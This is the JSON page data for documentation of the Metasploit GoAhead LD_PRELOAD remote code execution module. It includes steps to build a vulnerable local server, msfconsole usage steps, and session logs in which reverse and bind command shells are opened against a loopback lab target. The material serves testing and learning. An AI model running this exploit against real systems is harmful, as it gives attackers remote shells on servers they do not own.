{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/goahead_ldpreload","result":{"data":{"moduleMetadataJson":{"id":"988f3022-34f1-5ea5-8cd4-eb02e037dded","name":"GoAhead Web Server LD_PRELOAD Arbitrary Module Load","fullname":"exploit/linux/http/goahead_ldpreload","description":"This module triggers an arbitrary shared library load vulnerability\n        in GoAhead web server versions between 2.5 and that have the CGI module\n        enabled.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/goahead_ldpreload","documentationSlug":"/modules/documentation/exploit/linux/http/goahead_ldpreload","referencesSlug":"/modules/references/exploit/linux/http/goahead_ldpreload"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The GoAhead httpd server between versions 2.5 and 3.6.4 are vulnerable to an arbitrary code execution\nvulnerability where a remote attacker can force a supplied shared library to be loaded into the process\nof a CGI application. This module delivers a shared library payload as the raw data to a POST request\nand forces this to be loaded by specifying a <code class=\"language-text\">LD_PRELOAD</code> value of <code class=\"language-text\">/proc/self/fd/0</code>.</p>\n<h3 id=\"kali-20173-and-ubuntu-1604-install-instructions\" style=\"position:relative;\"><a href=\"#kali-20173-and-ubuntu-1604-install-instructions\" aria-label=\"kali 20173 and ubuntu 1604 install instructions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kali 2017.3 and Ubuntu 16.04 Install Instructions</h3>\n<p>These instructions are based on the vulerability analysis by <a href=\"https://www.elttam.com.au/blog/goahead/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">elttam.com.au</a></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">git clone https://github.com/embedthis/goahead.git\ncd goahead/\ngit checkout tags/v3.6.4 -q\nmake &gt; /dev/null\ncd test\ngcc ./cgitest.c -o cgi-bin/cgitest\n../build/linux-x64-default/bin/goahead . 127.1.1.1:8080</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/http/goahead_ldpreload</code></li>\n<li>Do: <code class=\"language-text\">set rhost [ip]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGET_URI</strong></p>\n<p>  Optional. The full path to a CGI endpoint on the target server.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"goahead-364-on-ubuntu-1604-x64\" style=\"position:relative;\"><a href=\"#goahead-364-on-ubuntu-1604-x64\" aria-label=\"goahead 364 on ubuntu 1604 x64 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GoAhead 3.6.4 on Ubuntu 16.04 x64</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf&gt; use exploit/linux/http/goahead_preload\nmsf exploit(goahead_ldpreload) &gt; set RHOST 127.1.1.1\nmsf exploit(goahead_ldpreload) &gt; set RPORT 8080\nmsf exploit(goahead_ldpreload) &gt; check\n\n[*] Searching 390 paths for an exploitable CGI endpoint...\n[+] Exploitable CGI located at /cgi-bin/cgitest\n[+] 127.1.1.1:8080 The target is vulnerable.\n\nmsf exploit(goahead_ldpreload) &gt; exploit\n\n[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?\n[*] Started reverse TCP handler on 127.0.0.1:4444\n[*] Searching 390 paths for an exploitable CGI endpoint...\n[+] Exploitable CGI located at /cgi-bin/cgitest\n[*] Command shell session 4 opened (127.0.0.1:4444 -&gt; 127.0.0.1:32988) at 2017-12-28 16:26:50 -0600\n\nuname -a\nLinux smash 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\nexit\n\nmsf exploit(goahead_ldpreload) &gt; set TARGET 1\nmsf exploit(goahead_ldpreload) &gt; unset PAYLOAD\nmsf exploit(goahead_ldpreload) &gt; exploit\n\n[*] Started bind handler\n[*] Searching 390 paths for an exploitable CGI endpoint...\n[+] Exploitable CGI located at /cgi-bin/cgitest\n[*] Command shell session 5 opened (127.0.0.1:30836 -&gt; 127.1.1.1:4444) at 2017-12-28 16:28:04 -0600\n\nuname -a\nLinux smash 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\nexit\n\nmsf exploit(goahead_ldpreload) &gt; set TARGET 2\nmsf exploit(goahead_ldpreload) &gt; unset PAYLOAD\nmsf exploit(goahead_ldpreload) &gt; exploit\n\n[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?\n[*] Started reverse TCP double handler on 127.0.0.1:4444\n[*] Searching 390 paths for an exploitable CGI endpoint...\n[+] Exploitable CGI located at /cgi-bin/cgitest\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo sNRXNjxWl7ic0uWw;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: &quot;sNRXNjxWl7ic0uWw\\r\\n&quot;\n[*] Matching...\n[*] A is input...\n[*] Command shell session 6 opened (127.0.0.1:4444 -&gt; 127.0.0.1:32995) at 2017-12-28 16:28:56 -0600\n\nuname -a\nLinux smash 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n\n\nmsf exploit(goahead_ldpreload) &gt; set TARGET 4\nmsf exploit(goahead_ldpreload) &gt; unset PAYLOAD\nmsf exploit(goahead_ldpreload) &gt; exploit\n\n[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?\n[*] Started reverse TCP handler on 127.0.0.1:4444\n[*] Searching 390 paths for an exploitable CGI endpoint...\n[+] Exploitable CGI located at /cgi-bin/cgitest\n[*] Command shell session 7 opened (127.0.0.1:4444 -&gt; 127.0.0.1:33000) at 2017-12-28 16:29:34 -0600\n\nuname -a\nLinux smash 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"logging\" style=\"position:relative;\"><a href=\"#logging\" aria-label=\"logging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Logging</h2>\n<p>Each 404 error will generate a console or log entry similar to <code class=\"language-text\">goahead: 0: Cannot find CGI program:</code>.</p>"}}},"pageContext":{"id":"988f3022-34f1-5ea5-8cd4-eb02e037dded"}}}